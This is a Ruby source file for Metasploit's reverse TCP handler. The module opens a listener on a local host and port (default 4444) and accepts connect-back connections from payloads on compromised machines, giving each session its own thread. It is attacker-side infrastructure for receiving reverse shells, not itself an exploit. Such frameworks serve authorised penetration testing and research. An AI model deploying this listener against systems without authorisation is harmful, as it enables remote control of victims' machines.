module Msf
module Handler

###
#
# This module implements the reverse TCP handler.  This means
# that it listens on a port waiting for a connection until
# either one is established or it is told to abort.
#
# This handler depends on having a local host and port to
# listen on.
#
###
module ReverseTcp

	include Msf::Handler

	#
	# Returns the string representation of the handler type, in this case
	# 'reverse_tcp'.
	#
	def self.handler_type
		return "reverse_tcp"
	end

	#
	# Returns the connection-described general handler type, in this case
	# 'reverse'.
	#
	def self.general_handler_type
		"reverse"
	end

	#
	# Initializes the reverse TCP handler and ads the options that are required
	# for all reverse TCP payloads, like local host and local port.
	#
	def initialize(info = {})
		super

		register_options(
			[
				Opt::LHOST,
				Opt::LPORT(4444)
			], Msf::Handler::ReverseTcp)

		self.conn_threads = []
	end

	#
	# Starts the listener but does not actually attempt
	# to accept a connection.  Throws socket exceptions
	# if it fails to start the listener.
	#
	def setup_handler
		if datastore['Proxies']
			raise RuntimeError, 'TCP connect-back payloads cannot be used with Proxies'
		end

		ex = false
		# Switch to IPv6 ANY address if the LHOST is also IPv6
		addr = Rex::Socket.resolv_nbo(datastore['LHOST'])
		# First attempt to bind ANY_ADDR.  If that fails, the user probably has
		# something else listening on one interface.  Try again with the
		# specific LHOST.  Use the any addr for whatever LHOST was, ipv4 or 6.
		any = (addr.length == 4) ? "0.0.0.0" : "::0"
		[ any, Rex::Socket.addr_ntoa(addr) ].each { |ip|
			begin
				print_status("Handler trying to bind to #{ip}") if ip != any
				self.listener_sock = Rex::Socket::TcpServer.create(
					'LocalHost' => ip,
					'LocalPort' => datastore['LPORT'].to_i,
					'Comm'      => comm,
					'Context'   =>
						{
							'Msf'        => framework,
							'MsfPayload' => self,
							'MsfExploit' => assoc_exploit
						})
				ex = false
				break
			rescue
				ex = $!
				print_error("Handler failed to bind to #{ip}")
			end
		}
		raise ex if (ex) 
	end

	#
	# Closes the listener socket if one was created.
	#
	def cleanup_handler
		stop_handler

		# Kill any remaining handle_connection threads that might
		# be hanging around
		conn_threads.each { |thr|
			thr.kill
		}
	end

	#
	# Starts monitoring for an inbound connection.
	#
	def start_handler
		self.listener_thread = Thread.new {
			client = nil

			print_status("Started reverse handler")

			begin
				# Accept a client connection
				begin
					client = self.listener_sock.accept	
				rescue
					wlog("Exception raised during listener accept: #{$!}\n\n#{$@.join("\n")}")
					return nil
				end

				# Increment the has connection counter
				self.pending_connections += 1
	
				# Start a new thread and pass the client connection
				# as the input and output pipe.  Client's are expected
				# to implement the Stream interface.
				conn_threads << Thread.new {
					begin
						handle_connection(client)
					rescue
						elog("Exception raised from handle_connection: #{$!}\n\n#{$@.join("\n")}")
					end
				}
			end while true
		}
	end

	# 
	# Stops monitoring for an inbound connection.
	#
	def stop_handler
		# Terminate the listener thread
		if (self.listener_thread and self.listener_thread.alive? == true)
			self.listener_thread.kill
			self.listener_thread = nil
		end

		if (self.listener_sock)
			self.listener_sock.close
			self.listener_sock = nil
		end
	end

protected

	attr_accessor :listener_sock # :nodoc:
	attr_accessor :listener_thread # :nodoc:
	attr_accessor :conn_threads # :nodoc:

end

end
end
